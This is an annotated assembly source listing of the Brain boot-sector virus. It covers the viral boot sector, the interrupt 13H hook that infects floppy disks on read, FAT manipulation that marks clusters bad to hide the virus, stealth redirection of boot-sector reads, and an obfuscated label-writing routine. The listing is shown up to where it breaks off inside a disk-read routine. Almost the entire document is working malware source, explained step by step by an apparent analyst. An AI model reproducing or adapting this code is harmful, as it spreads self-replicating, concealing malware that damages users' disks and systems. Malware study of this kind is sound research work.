;The Pakistani Brain Virus. This is the extended code section of the virus.




.RADIX 16

.MODEL  TINY

.CODE

int13_Off       EQU     0004CH                  ;interrupt 13H location
int13_Seg       EQU     0004EH
int6d_Off       EQU     001B4H                  ;interrupt 6DH location
int6d_Seg       EQU     001B6H

INF_HEAD        EQU     6                       ;these are defined in BRAIN.ASM
INF_SECTOR      EQU     7                       ;the BRAIN virus boot sector
INF_CYL         EQU     8
CURR_HEAD       EQU     9
CURR_SECCYL     EQU     0AH


;******************************************************************************
;The code at 100H is just a jump to 200H. Code for the extended sectors of the
;virus must be compiled with an offset of 200H, as they will be executed
;with that offset in high memory. The start at offset 100H with a jump just
;lets us assemble this file as a COM file.

                ORG     100H

COM_START:      jmp     START_VIRUS



;******************************************************************************
;The following is the virus startup code, continued from the viral boot sector.
;All it does is move the Interrupt 13H (Disk access) vector to location 6DH,
;and replace the Interrupt 13H vector with its own handler, INT13_HNDLR. After
;that, the virus loads the original boot sector from the hidden area where it
;stored it, places it in the usual location at 0000:7C00, and then transfers
;control to it.

                ORG     200H

START_VIRUS:    JMP     SHORT VIRUS             ;Beginning of hidden virus sectors

                DB      '(c) 1986 Jork  & Amjads (pvt) Ltd ',0
NT0_COUNTER     DB      04
DRIVE_NO        DB      00
INFECT_FLAG     DB      00

VIRUS:
                MOV     BYTE PTR CS:NT0_COUNTER,1FH ;
                XOR     AX,AX
                MOV     DS,AX                    ;ds=0

                MOV     AX,WORD PTR DS:int13_Off ;Move int 13H to int 6DH
                MOV     WORD PTR DS:int6d_Off,AX ;
                MOV     AX,WORD PTR DS:int13_Seg ;
                MOV     WORD PTR DS:int6d_Seg,AX ;

                MOV     AX,OFFSET INT13_HNDLR    ;redirect int 13H to virus
                MOV     WORD PTR DS:int13_Off,AX
                MOV     AX,CS
                MOV     WORD PTR DS:int13_Seg,AX
                MOV     CX,4                     ;Retry count for disk read
                XOR     AX,AX
                MOV     ES,AX                    ;es=0
VLOOP:          PUSH    CX
                MOV     DH,BYTE PTR CS:INF_HEAD  ;Attempt to read original boot
                MOV     DL,0                     ;sector from this trk/hd/sec
                MOV     CX,WORD PTR CS:INF_SECTOR;as stored in BRAIN boot sec
                MOV     AX,0201H
                MOV     BX,7C00H                 ;Put it in usual boot sec loc
                INT     6DH                      ;Clean disk read under BRAIN
                JNB     GO_EXEC_BOOT             ;Continue if no error
                MOV     AH,0                     ;If error, try to reset disk
                INT     6DH
                POP     CX
                LOOP    VLOOP                    ;and loop until retry ctr 0
                INT     18H                      ;if count expires, go to ROM

GO_EXEC_BOOT:   DB      0EAH,0,7CH,0,0           ;jmp far ptr 0:07C00H
                NOP                              ;end of the virus startup code

;******************************************************************************
;This is the virus' Interrupt 13H (disk) handler. It is where all of the
;interesting things happen. It filters all disk activity as long as the virus
;is active.

INT13_HNDLR     PROC    FAR
                STI                             ;turn interrupts on
                CMP     AH,2                    ;is this interrutp a disk read?
                JNE     DONT_PROCESS            ;no, just let BIOS handle it
                CMP     DL,2                    ;is it a drive above 2?
                JA      DONT_PROCESS            ;yes, let BIOS handle it
                CMP     CH,0                    ;is it cylinder 0?
                JNE     NOT_CYL_0               ;jump if not
                CMP     DH,0                    ;is it head 0?
                JE      RD_CYL0HD0              ;Cyl 0, Hd 0, go do nice things

NOT_CYL_0:      DEC     CS:NT0_COUNTER          ;miscelaneous disk read, dec ctr
                JNE     DONT_PROCESS            ;and if <> 0, pass to BIOS
                JMP     SHORT RD_CYL0HD0        ;else do nice things

DONT_PROCESS:   JMP     NEAR PTR BIOS_DISK      ;go pass control to BIOS

;if we get here, the virus is going to do something more than let BIOS process
;the disk access.
RD_CYL0HD0:     MOV     CS:INFECT_FLAG,0        ;clear this flag
                MOV     CS:NT0_COUNTER,4        ;reset this counter to 4
                PUSH    AX                      ;save registers now
                PUSH    BX
                PUSH    CX
                PUSH    DX
                MOV     BYTE PTR CS:DRIVE_NO,DL ;put drive number here
                MOV     CX,4                    ;retry counter
BOOT_READ:      PUSH    CX
                MOV     AH,0                    ;attempt to reset diskette
                INT     6DH                     ;using BIOS disk interrupt
                JB      RESET_FAILED            ;go handle an error if c set
                MOV     DH,0                    ;prep to read boot sector
                MOV     CX,0001H                ;into buffer at es:bx
                MOV     BX,OFFSET DISK_BUFFER
                PUSH    ES
                MOV     AX,CS
                MOV     ES,AX
                MOV     AX,0201H                ;read one sector
                INT     6DH                     ;again use BIOS disk interrupt
                POP     ES                      ;restore es
                JNB     READ_OK                 ;go process successful read
RESET_FAILED:   POP     CX                      ;else retry if disk op failed
                LOOP    BOOT_READ
                JMP     SHORT DISK_FAILURE      ;retries expired, go fail
                NOP

READ_OK:        POP     CX                      ;clear retry counter off stack
                MOV     AX,WORD PTR CS:RBRAIN_ID;look for infected disk
                CMP     AX,1234H                ;BRAIN_ID is 1234H if infected
                JNE     NOT_INFECTED            ;if not infected, go get it
                MOV     CS:INFECT_FLAG,1        ;set flag to indicate infected
                JMP     SHORT ALREADY_INFECTED  ;and go continue processing
                                                ;
NOT_INFECTED:   PUSH    DS                      ;come here if not infected yet
                PUSH    ES                      ;save ds & es
                MOV     AX,CS                   ;and set ds=es=cs
                MOV     DS,AX
                MOV     ES,AX
                PUSH    SI
                CALL    INFECT_DISK             ;go infect the diskette
                JB      INF_ERROR               ;jump if it couldn't do it
                MOV     CS:INFECT_FLAG,2        ;else update flag
                CALL    NEAR PTR PUT_LABEL      ;put (C) Brain label in root dir
INF_ERROR:      POP     SI                      ;restore registers
                POP     ES
                POP     DS
                JNB     ALREADY_INFECTED        ;if successful, go finish int 13

DISK_FAILURE:   MOV     AH,00                   ;else attempt disk reset
                INT     6DH                     ;one last time

;Control comes here once the disk has been infected. Now the virus cleans up
;and executes the interrupt 13H intended by the caller.
ALREADY_INFECTED:
                POP     DX                      ;restore these register
                POP     CX
                POP     BX
                POP     AX
                CMP     CX,1                    ;an operation on boot sector?
                JNE     BIOS_DISK               ;no, let BIOS handle it
                CMP     DH,0                    ;still looking for boot sector
                JNE     BIOS_DISK
                CMP     CS:INFECT_FLAG,1        ;boot sector, is disk infected?
                JNE     INF_02                  ;maybe not, go on
                MOV     CX,CS:RSTART_SECCYL     ;yes, read boot sector
                MOV     DX,WORD PTR CS:RSTART_HEAD-1 ;from hidden area where virus is
                MOV     DL,CS:DRIVE_NO
                JMP     SHORT BIOS_DISK         ;and let BIOS do the read
INF_02:         CMP     CS:INFECT_FLAG,2        ;check 2nd infect possibility
                JNE     BIOS_DISK               ;nope, let BIOS handle uninf bs
                MOV     CX,WORD PTR CS:INF_SECTOR ;yes, infected
                MOV     DH,BYTE PTR CS:INF_HEAD ;read boot sector from here
BIOS_DISK:      INT     6DH                     ;do original BIOS disk interrupt
                RETF    2                       ;interrupt return, keep flags

INT13_HNDLR     ENDP

                DB      15D DUP (0)             ;random bytes


;******************************************************************************
;This routine modifies the FAT table on a 360K disk to accomodate the virus. It
;looks for 3 contiguous open clusters in the FAT. To do this, it loads the FAT
;into RAM and searches it. If it finds 3 contiguous clusters, it marks them
;bad in RAM and then writes the FAT out to disk.

MODIFY_FAT      PROC    NEAR
                JMP     SHORT PAST_CPYRT        ;jump past the following data
                NOP

CLUSTER_CNT     DW      3                       ;counter used in this procedure

C_NOTICE        DB      ' (c) 1986 Brain & Amjads (pvt) Ltd'

PAST_CPYRT:     CALL    READ_FAT                ;read the FAT from disk into RAM
                MOV     AX,[DISK_BUFFER]        ;get diskette type
                CMP     AX,0FFFDH               ;is it a 360K DSDD diskette?
                JE      DISK_360                ;if so, continue processing
                MOV     AL,3                    ;for any other kind, return al=3
                STC                             ;and carry set
                RETN

;Come here if it is a standard 360K DSDD diskette
DISK_360:       MOV     CX,37H                  ;start looking at FAT entry 37H
                MOV     [CLUSTER_CNT],0         ;zero cluster counter
CLUST_LOOP:     CALL    READ_FAT_ENTRY          ;get individual FAT entry
                CMP     AX,0000H                ;if 0, that cluster is empty
                JNE     NOT_EMPTY               ;if not empty, reset CLUSTER_CNT
                INC     [CLUSTER_CNT]           ;else increment it
                CMP     [CLUSTER_CNT],3         ;do we have 3 consecutive
                JNE     FIND_ANOTHER            ;clusters free? jump if not
                JMP     SHORT SPACE_FOUND       ;else this is where the virus
                NOP                             ;will go, go mark off the space

NOT_EMPTY:      MOV     [CLUSTER_CNT],0         ;last one wasn't empty

FIND_ANOTHER:   INC     CX                      ;look at next cluster
                CMP     CX,0163H                ;make sure we're not at end
                JNE     CLUST_LOOP              ;of disk, and check next cluster
                MOV     AL,1                    ;at end of disk, set al=1
                STC                             ;set carry to indicate error
                RETN                            ;and exit

;Found space on disk for virus, mark those clusters bad now
SPACE_FOUND:    MOV     DL,3                    ;counter for clusters to mark
SF_LOOP:        CALL    WRITE_BAD_FAT           ;mark cluster number cx bad
                DEC     CX                      ;back up one cluster
                DEC     DL                      ;decrement cluster counter
                JNE     SF_LOOP                 ;loop until counter 0
                INC     CX                      ;cx points to first bad cluster
                CALL    COMP_HD_TRK_SEC         ;turn cx into cyl/hd/sec data
                CALL    WRITE_FAT               ;write both FATs back to disk
                MOV     AL,0                    ;set al=0 to indicate success
                CLC                             ;clear carry
                RETN                            ;and exit
MODIFY_FAT      ENDP


;******************************************************************************
;This routine is passed a FAT entry number in cx, and it puts a bad cluster
;marker (FF7 Hex) into that entry slot in both FATs in memory, stored at
;DISK_BUFFER and DISK_BUFFER+400H.

WRITE_BAD_FAT   PROC    NEAR
                PUSH    CX                      ;save cx and dx
                PUSH    DX
                MOV     SI,OFFSET DISK_BUFFER   ;DISK_BUFFER where FAT is
                MOV     AL,CL                   ;See if entry # is even or odd
                SHR     AL,1
                JB      WR_ODD                  ;go handle odd FAT entry number
                CALL    GET_FAT_OFFSET          ;even, get offset of entry
                MOV     AX,WORD PTR [BX+SI]     ;read existing value
                AND     AX,0F000H               ;mask lower entry
                OR      AX,0FF7H                ;set lower entry to bad sector
                JMP     SHORT WBF_DONE          ;all done with even
                NOP

WR_ODD:         CALL    GET_FAT_OFFSET          ;odd, get offset of entry
                MOV     AX,WORD PTR [BX+SI]     ;read existing value
                AND     AX,000FH                ;mask high entry
                OR      AX,0FF70H               ;set high entry to bad sector

WBF_DONE:       MOV     [BX+SI],AX              ;write entry back to FAT in RAM
                MOV     [BX+SI+400H],AX         ;and write it to 2nd FAT also!
                POP     DX                      ;restore DX and CX
                POP     CX
                RETN

WRITE_BAD_FAT   ENDP


;******************************************************************************
;This procedure reads the FAT entry number requested in cx and puts the result
;in ax.

READ_FAT_ENTRY  PROC    NEAR
                PUSH    CX                      ;save FAT entry number
                MOV     SI,OFFSET DISK_BUFFER   ;FAT is stored here
                MOV     AL,CL                   ;See if AL is odd or even
                SHR     AL,1                    ;put parity bit in c
                JB      DO_ODD                  ;and go handle the odd case
                CALL    GET_FAT_OFFSET          ;handle even / get proper offset
                MOV     AX,WORD PTR [BX+SI]     ;read entry into ax
                AND     AX,0FFFH                ;and mask lower entry off
                JMP     SHORT RF_EXIT           ;all done
                NOP

DO_ODD:         CALL    GET_FAT_OFFSET          ;odd entry #, get offset
                MOV     AX,WORD PTR [BX+SI]     ;read entry into table
                AND     AX,0FFF0H               ;mask upper entry off
                MOV     CL,4                    ;and shift it down 4 bits
                SHR     AX,CL

RF_EXIT:        POP     CX                      ;restore cx
                RETN                            ;Return with ax=FAT entry

READ_FAT_ENTRY  ENDP


;******************************************************************************
;Find the offset of the FAT entry (in bytes) in the FAT table, which is stored
;in RAM. The FAT entry number is passed to this procedure in cx, and the offset
;is returned in bx. Each FAT entry takes up 12 bits on a 360K disk, so this
;procedure essentially has to multiply the entry number by 1.5.

GET_FAT_OFFSET  PROC    NEAR
                PUSH    DX                      ;preserve dx here
                MOV     AX,3                    ;multiply cx by 3
                MUL     CX
                SHR     AX,1                    ;and divide by 2
                MOV     BX,AX                   ;put result in bx
                POP     DX
                RETN

GET_FAT_OFFSET  ENDP


;******************************************************************************
;This reads both FAT tables from a 360K disk into the buffer DISK_BUFFER.

READ_FAT        PROC    NEAR
                MOV     AH,2                    ;set up read function
                CALL    RD_WRT_FAT              ;go perform the operation
                RETN

READ_FAT        ENDP


;******************************************************************************
;This writes both FAT tables to a 360K disk from the DISK_BUFFER.

WRITE_FAT       PROC    NEAR
                MOV     AH,3                    ;set up write function
                CALL    RD_WRT_FAT              ;go perform the operation
                RETN

WRITE_FAT       ENDP


;******************************************************************************
;This procedure actually performs the read or write function to read or
;write the FAT from/to a 360 K disk. The disk command is passed to this
;procedure in ah.

RD_WRT_FAT      PROC    NEAR
                MOV     CX,4                    ;retry counter = 4
DSK_LP:         PUSH    CX                      ;save it
                PUSH    AX                      ;preserve ax too
                MOV     AH,00                   ;reset the disk first
                INT     6DH
                POP     AX
                JB      DSK_BAD                 ;jump if reset fails
                MOV     BX,OFFSET DISK_BUFFER
                MOV     AL,4                    ;read/write 4 sectors
                MOV     DH,0                    ;at cyl 0, hd 0, sec 2
                MOV     DL,[DRIVE_NO]
                MOV     CX,2
                PUSH    AX                      ;save ax
                INT     6DH                     ;go do it
                POP     AX
                JNB     RWFAT_OK                ;exit if successful
DSK_BAD:        POP     CX                      ;else retry
                LOOP    DSK_LP                  ;if counter not zero
                POP     AX                      ;these pops look like a bug!
                POP     AX
                MOV     AL,2                    ;set carry and al=2
                STC                             ;as an indicator of failure
                RETN                            ;and return

RWFAT_OK:       POP     CX                      ;clear stack and return
                RETN                            ;with c reset on success

RD_WRT_FAT      ENDP


;******************************************************************************
;This routine computes cyl, hd, and sec numbers from a cluster number passed in
;cx. It is used to determine where to do writes using BIOS, based on the
;cluster numbers gathered from the FAT when marking out a bad area. The cyl,
;hd, sec info is stored in INF_CYL, INF_HEAD and INF_SECTOR.

COMP_HD_TRK_SEC PROC    NEAR
                PUSH    CX                      ;cluster number in cx
                SUB     CX,2
                SHL     CX,1                    ;
                ADD     CX,0CH                  ;cx = absolute sector number now
                MOV     AX,CX
                MOV     CL,12H                  ;cl = 18, sectors per cylinder
                DIV     CL                      ;al = trk, ah= sec in cylinder
                MOV     BYTE PTR DS:INF_CYL,AL  ;cyl of 1st sector in cluster
                MOV     BYTE PTR DS:INF_HEAD,00 ;assume head is 0
                INC     AH                      ;sector number goes 1 to 18
                CMP     AH,9                    ;is it greater than 9?
                JNA     CHTS_1                  ;no, so head is 0, sec # is ok
                SUB     AH,9                    ;else subtract 9 sectors
                MOV     BYTE PTR DS:INF_HEAD,01 ;and set head = 1
CHTS_1:         MOV     BYTE PTR DS:INF_SECTOR,AH;save sector number here
                POP     CX                      ;restore cluster number
                RETN                            ;and exit

COMP_HD_TRK_SEC ENDP

;-----------------------------------------------------
                DB      6D DUP (0)

DISK_FCTN       DB      3
DIR_ENTRIES     DW      5BH
TEMP_W1         DW      303H
TEMP_W2         DW      0EBE
TEMP_W3         DW      1
TEMP_W4         DW      100H


                DB      0E0H,0D8H,9DH,0D7H
                DB      0E0H,09FH,8DH,98H,09FH,8EH
                DB      0E0H
                DB      ' (c) ashar $'


;******************************************************************************
;This procedure puts the '(C)Brain' label in the root directory to notify the
;user that that diskette has been infected by the brain virus.

PUT_LABEL       PROC    NEAR
                CALL    READ_ROOT_DIR           ;read root directory from disk
                JB      PL_ERR                  ;exit on error
                PUSH    DI                      ;preserve di
                CALL    WRITE_LABEL             ;write the label in memory
                POP     DI
                JB      PL_ERR                  ;exit on error
                CALL    WRITE_ROOT_DIR          ;and write memory image to disk
PL_ERR:         RETN


PUT_LABEL       ENDP

                DB      0BBH,9BH,04,0B9H,0BH,00 ;random unused bytes here
                DB      8AH,07,0F6H,0D8H,88H,04
                DB      46H,43H,0E2H,0F6H,0B0H,08
                DB      88H,04,0F8H,0C3H,0C6H,06


;******************************************************************************
;This procedure modifies the image of the root directory in memory to put the
;label '(C) Brain' in one directory entry. The label will be inserted in the
;first open entry, or it will overwrite the existing label, if there is one.
;This is an incredibly tricky procedure. It makes an attempt to fool anyone who
;tries to disassemble it, and confuse the heck out of them, using already
;executed instructions for data, etc. It is fully documented in the
;accompanying text.

WRITE_LABEL     PROC    NEAR
                MOV     DIR_ENTRIES,6CH         ;number of dir entries available
                MOV     SI,OFFSET DISK_BUFFER+40H ;assume DOS files are there
                MOV     TEMP_W1,DX              ;save dx
                MOV     AX,DIR_ENTRIES
                SHR     AX,1
                MOV     TEMP_W3,AX              ;TEMP_W3 = 36H
                SHR     AX,1
                MOV     TEMP_W2,AX              ;TEMP_W2 = 1BH   * needlessly
                XCHG    AX,CX
                AND     CL,43H                  ;CL = 3          * confusing
                MOV     DI,TEMP_W2
                ADD     DI,01E3H                ;DI = 1FE Hex    * code

DS_LOOP:        MOV     AL,BYTE PTR [SI]        ;check a directory entry
                CMP     AL,0                    ;is it empty?
                JE      USE_DIR_ENTRY           ;yes, use it for label
                MOV     AL,BYTE PTR [SI+0BH]    ;else check attribute
                AND     AL,8                    ;is it a label?
                CMP     AL,8
                JE      USE_DIR_ENTRY           ;if a label, go change it
                ADD     SI,20H                  ;else go to next dir entry
                DEC     DIR_ENTRIES             ;decrement counter
                JNE     DS_LOOP                 ;and loop until all checked
                STC                             ;if no room for label set carry
                RETN                            ;and return


                DB      8BH                     ;more confusion


USE_DIR_ENTRY:  MOV     BX,WORD PTR [DI]        ;BX=ds:[1FE]=
                XOR     BX,TEMP_W3              ;BX=36H
                MOV     TEMP_W3,SI              ;TEMP_W3 = ptr to dir entry
                CLI                             ;turn OFF Interrupts
                MOV     AX,SS
                MOV     TEMP_W1,AX              ;save ss here
                MOV     TEMP_W2,SP              ;and sp here
                MOV     AX,CS
                MOV     SS,AX                   ;ss=cs
                MOV     SP,TEMP_W3              ;sp = dir entry
                ADD     SP,0CH                  ;at end of name

                MOV     CL,51H                  ;here is where the fun starts
                ADD     DX,444CH                ; none of this code
                MOV     DI,2555H                ;really does anything
                MOV     CX,0C03H                ;except act as data for
                REPZ    CMPSW                   ;what follows
                MOV     AX,0B46H
                MOV     CX,0003H
                ROL     AX,CL                   ;AX=5A30H
                MOV     TEMP_W3,AX              ;put it here

                MOV     CX,5                    ;OK, real code, loop counter = 5
                MOV     DX,0008H                ;nonsense
                SUB     TEMP_W3,5210H           ;adjust TEMP_W3 to 0820H
                PUSH    TEMP_W3                 ;use to set attribute, last byte

;LP1 and LP2 decode the above nonsense code. BX is set to the start of the
;dual purpose code upon entry here.
LP1:            MOV     AH,BYTE PTR [BX]        ;get a byte from the code
                INC     BX                      ;move pointer up
                MOV     DL,AH                   ;this one goes in ah
                SHL     DL,1                    ;is byte greater than 7FH?
                JB      LP1                     ;yes, go get another

LP2:            MOV     DL,BYTE PTR [BX]        ;else get another byte
                INC     BX                      ;move pointer up
                MOV     AL,DL                   ;this one goes in al
                SHL     DL,1                    ;is byte greater than 7FH?
                JB      LP2                     ;yes, go get another

                ADD     AX,1D1DH                ;word in ax, add 1D1D to it
                PUSH    AX                      ;and use this byte to make label
                INC     WORD PTR TEMP_W3        ;no apparent purpose

                JNB     LP3                     ;this always jumps

                DB      0EA                     ;nonsense


LP3:            LOOP    LP1                     ;loop 5 times
                MOV     SP,WORD PTR DS:TEMP_W2  ;restore sp
                MOV     AX,WORD PTR DS:TEMP_W1  ;and ss
                MOV     SS,AX
                STI                             ;turn ON Interrupts
                ADD     DH,BYTE PTR [BP+SI]     ;more nonsense
                CLC                             ;clear c to indicate success
                RETN                            ;and exit
WRITE_LABEL     ENDP


;******************************************************************************
;This procedure reads the entire root directory of a 360K floppy disk into
;memory at the location DISK_BUFFER.

READ_ROOT_DIR   PROC    NEAR
                MOV     [DISK_FCTN],2           ;set up for a read
                JMP     SHORT ROOT_RW           ;and go do it in procedure below
                NOP
READ_ROOT_DIR   ENDP


;******************************************************************************
;This procedure writes the entire root directory of a 360K floppy disk from
;memory at the location DISK_BUFFER.

WRITE_ROOT_DIR  PROC    NEAR
                MOV     [DISK_FCTN],3           ;set up for a write
                JMP     SHORT ROOT_RW           ;and go do it
                NOP
WRITE_ROOT_DIR  ENDP


;******************************************************************************
;This procedrue performs the actual mechanics of reading/writing the root
;directory on a 360K floppy disk. It is called only from READ_ROOT_DIR and
;WRITE_ROOT_DIR above.

ROOT_RW         PROC    NEAR
                MOV     DH,0                    ;read/write cyl 0, hd 0, sec 6
                MOV     DL,[DRIVE_NO]
                MOV     CX,0006H
                MOV     AH,[DISK_FCTN]
                MOV     AL,04                   ;read/write 4 sectors
                MOV     BX,OFFSET DISK_BUFFER   ;to/from here
                CALL    DISK_OPERATION          ;go do it
                JB      RRW_ERR                 ;exit on error
                MOV     CX,1                    ;next rd/wrt cyl 0, hd 1, sec 1
                MOV     DH,1
                MOV     AH,[DISK_FCTN]
                MOV     AL,3                    ;read/write 3 more sectors
                ADD     BX,800H                 ;move buffer ptr up
                CALL    DISK_OPERATION
RRW_ERR:        RETN

ROOT_RW         ENDP


;******************************************************************************
;This routine just performs a disk interrupt, with the added niceties of
;doing a disk reset before performing the requested operation, and allowing
;for up to 4 retries in the event that the interrupt is not successful. AX,
;BX,CX,DX and ES are set up just as they would be in doing a direct Int 13H
;when this routine is called.

DISK_OPERATION  PROC    NEAR
                MOV     [TEMP_W1],AX            ;save ax,bx,cx & dx
                MOV     [TEMP_W2],BX
                MOV     [TEMP_W3],CX
                MOV     [TEMP_W4],DX
                MOV     CX,4                    ;retry counter = 4
DO_LOOP:        PUSH    CX
                MOV     AH,0                    ;reset disk first
                INT     6DH
                JB      DSK_FAIL                ;jump if reset failed
                MOV     AX,[TEMP_W1]            ;restore ax,bx,cx & dx
                MOV     BX,[TEMP_W2]
                MOV     CX,[TEMP_W3]
                MOV     DX,[TEMP_W4]
                INT     6DH                     ;and perform requested disk op
                JNB     DSK_OK                  ;jump if it was successful
DSK_FAIL:       POP     CX                      ;else retry up to 4 times
                LOOP    DO_LOOP
                STC                             ;if retry cnt expired, set c
                RETN                            ;and exit

DSK_OK:         POP     CX                      ;clean stack on success
                RETN                            ;and return with c clear

DISK_OPERATION  ENDP


                DB      00,00,00                ;Unnecessary bytes


;******************************************************************************
;The following routine moves the original boot sector on the disk to the first
;sector in the hidden area. Next, it moves five sectors from RAM onto the
;disk, right after the boot sector. Finally, it moves the viral boot sector
;from RAM into the boot sector position at Cylinder 0, Head 0, Track 1. It
;assumes that the location to put the virus in has already been found and
;placed in the INF_SECTOR/INF_HEAD variables. This routine returns with
;c set if it fails.

TEMP1           DW      3                        ;Temporary storage
DISK_OP         DW      301H                     ;Used by DISK_READ & DISK_WRITE
                                                 ;to indicate rd/wrt operation

INFECT_DISK     PROC    NEAR
                CALL    MODIFY_FAT               ;modify FAT table to hide virus
                JB      INF_EXIT                 ;exit on error
                MOV     WORD PTR DS:CURR_SECCYL,1
                MOV     BYTE PTR DS:CURR_HEAD,0  ;read the real boot sector
                MOV     BX,OFFSET DISK_BUFFER    ;into this buffer
                CALL    DISK_READ
                MOV     BX,OFFSET DISK_BUFFER
                MOV     AX,WORD PTR DS:INF_SECTOR
                MOV     WORD PTR DS:CURR_SECCYL,AX
                MOV     AH,BYTE PTR DS:INF_HEAD
                MOV     BYTE PTR DS:CURR_HEAD,AH ;and hide it in first sector of
                CALL    DISK_WRITE               ;hidden area on disk
                CALL    NEXT_SECTOR              ;move pointers to next sector
                MOV     CX,5                     ;sectors to write counter
                MOV     BX,0200H                 ;set buffer pointer=this code
INF_WRITE_LP:   MOV     [TEMP1],CX               ;save sector count here
                CALL    DISK_WRITE               ;write a sector to disk
                CALL    NEXT_SECTOR              ;move pointers to next sector
                ADD     BX,0200H                 ;increment buffer pointer
                MOV     CX,[TEMP1]               ;restore sector count
                LOOP    INF_WRITE_LP             ;loop until done
                MOV     BYTE PTR DS:CURR_HEAD,0
                MOV     WORD PTR DS:CURR_SECCYL,1
                MOV     BX,0                     ;Now put virus' boot sector
                CALL    DISK_WRITE               ;at cyl 0, hd 0, trk 1
                CLC                              ;clear c to indicate success
INF_EXIT:       RETN                             ;and exit

INFECT_DISK     ENDP


;******************************************************************************
;This procedure reads one sector into memory at es:bx using CURR_HEAD and
;CURR_SECCYL for the cylinder/head/sector numbers. It sets c upon return if
;the read operation fails.

DISK_READ       PROC    NEAR
                MOV     [DISK_OP],201H          ;instruction to read 1 sector
                JMP     SHORT DO_DISK           ;go execute operation
                NOP

DISK_READ       ENDP


;******************************************************************************
;This procedure writes one sector from memory at es:bx using CURR_HEAD and
;CURR_SECCYL for the cylinder/head/sector numbers. It sets c upon return if
;the write operation fails.
DISK_WRITE      PROC    NEAR
                MOV     [DISK_OP],301H ;        ;instruction to write 1 sector
                JMP     SHORT DO_DISK           ;go execute operation
                NOP

DISK_WRITE      ENDP


;******************************************************************************
;This works in conjunction with DISK_READ and DISK_WRITE above. It simply
;performs the requested disk operation, and attempts to complete it up to
;four times before giving up. If successful, it returns nc, else it returns
;with c set.

DO_DISK         PROC    NEAR
                PUSH    BX                      ;save buffer address
                MOV     CX,0004H                ;retry count
DD_LOOP:        PUSH    CX
                MOV     DH,BYTE PTR DS:CURR_HEAD
                MOV     DL,BYTE PTR DS:DRIVE_NO ;load current disk parameters
                MOV     CX,WORD PTR DS:CURR_SECCYL
                MOV     AX,[DISK_OP]            ;and the operation to perform
                INT     6DH                     ;and execute
                JNB     DD_OK                   ;jump if successful
                MOV     AH,0                    ;else attempt disk reset
                INT     6DH
                POP     CX                      ;and go through loop again
                LOOP    DD_LOOP
                POP     BX                      ;if loop expired, clean up
                POP     BX                      ;second pop here looks like bug
                STC                             ;set carry flag
                RETN                            ;and get out

DD_OK:          POP     CX                      ;disk operation successful
                POP     BX                      ;so clean up
                RETN                            ;and return with c clear

DO_DISK         ENDP


;******************************************************************************
;This procedure increments the memory variables CURR_SECCYL and CURR_HEAD
;to point to the next sector on a 360K disk. Upon entry, they contain a valid
;cylinder, head and sector number.
NEXT_SECTOR     PROC    NEAR
                INC     BYTE PTR DS:CURR_SECCYL     ;increment sector counter
                CMP     BYTE PTR DS:CURR_SECCYL,0AH ;is it 10 yet?
                JNE     NS_DONE                     ;no, all done
                MOV     BYTE PTR DS:CURR_SECCYL,1   ;yes, set it to 1
                INC     BYTE PTR DS:CURR_HEAD       ;and increment head counter
                CMP     BYTE PTR DS:CURR_HEAD,2     ;is head 2 yet?
                JNE     NS_DONE                     ;no, all done
                MOV     BYTE PTR DS:CURR_HEAD,0     ;yes, set it to 0
                INC     BYTE PTR DS:CURR_SECCYL+1   ;And increment cylinder ctr
NS_DONE:        RETN

NEXT_SECTOR     ENDP

;-----------------------------------------------------
                DB      64,74,61                ;dta


;******************************************************************************

DISK_BUFFER     DW      1CEBH,4990H             ;buffer for reading disk

RBRAIN_ID       DW      4D42H                   ;RAM BRAIN boot sector ID
RSTART_HEAD     DB      20H                     ;RAM based drive head
RSTART_SECCYL   DW      3420H                   ;sector and cylinder

                DB      2E,30,00,02,02       ;4.0...


;******************************************************************************
;This is the start of the BRAIN boot sector.
                ORG     7C00H


MEM_SIZE        EQU     413H


BRAIN           PROC NEAR
                CLI                             ;Turn OFF Interrupts
                JMP     NEAR PTR START

;-----------------------------------------------------

BRAIN_ID        DW      1234H
START_HEAD      DB      0
START_SECCYL    DB      7,0DH
HEAD_NO         DB      0
SECTOR_NO       DB      1
CYL_NO          DB      0
                DB      0,0,0,0

                DB      'Welcome to the  Dungeon         (c) 1986 Brain'
                DB      17H
                DB      '& Amjads (pvt) Ltd   VIRUS_SHOE  RECORD   '
                DB      'v9.0   Dedicated to the dynamic memories of millions '
                DB      'of virus who are no longer with us today - Thanks '
                DB      'GOODNESS!!       BEWARE OF THE er..VIRUS  : '
                DB      '\this program is catching      program '
                DB      'follows after these messeges..... $#@%$@!! '

;-----------------------------------------------------
START:          MOV     AX,CS                   ;*
                MOV     DS,AX
                MOV     SS,AX                   ;ss=ds=cs=0
                MOV     SP,0F000H               ;set up stack
                STI                             ;Turn ON Interrupts
                MOV     AL,[START_HEAD]         ;starting head number for read
                MOV     [HEAD_NO],AL
                MOV     CX,WORD PTR [START_SECCYL]
                MOV     WORD PTR [SECTOR_NO],CX
                CALL    NXT_SECTOR              ;set params for next disk sector
                MOV     CX,5                    ;Virus has 5 more sectors
                MOV     BX,7E00H                ;Load remainder of virus here
LOAD_VIRUS:     CALL    READ_DISK               ;Read a sector from disk
                CALL    NXT_SECTOR              ;set params for next disk sector
                ADD     BX,200H                 ;move buffer for next sector
                LOOP    LOAD_VIRUS              ;Dec CX;Loop if CX>0
                nop
                MOV     AX,WORD PTR DS:[MEM_SIZE]  ;Size of memory in kilobytes
                nop
                SUB     AX,7                    ;Decrement it by 7
                nop
                MOV     WORD PTR DS:[MEM_SIZE],AX
                nop
                MOV     CL,6
                nop
                SHL     AX,CL                   ;Convert resultant into seg @
                MOV     ES,AX                   ;And set es up with that segment
                MOV     SI,7C00H                ;Move this sector and the rest
                MOV     DI,0                    ;Up to high memory
                MOV     CX,1004H
                CLD                             ;Forward String Opers
                REP     MOVSB                   ;Mov DS:[SI]->ES:[DI]
                PUSH    ES                      ;Prepare for control transfer
                MOV     AX,200H                 ;to offset 200 (first of the
                PUSH    AX                      ;hidden sectors)
                RETF                            ;Go to high memory

BRAIN           ENDP

;Read a sector from disk. This preserves bx and cx
READ_DISK       PROC NEAR
                PUSH    CX
                PUSH    BX
                MOV     CX,4                    ;Retry count
READ_LOOP:      PUSH    CX
                MOV     DH,[HEAD_NO]
                MOV     DL,00
                MOV     CX,WORD PTR [SECTOR_NO]
                MOV     AX,0201H
                INT     13H                     ;read sector, into ES:BX
                JNB     READ_IS_OK              ;No error, so continue
                MOV     AH,00                   ;Attempt to reset if an error
                INT     13H                     ;DSK:00-reset, DL=drive
                POP     CX
                LOOP    READ_LOOP               ;Dec CX;Loop if CX>0
                INT     18H                     ;Startup ROM Basic if retries expired
READ_IS_OK:     POP     CX
                POP     BX
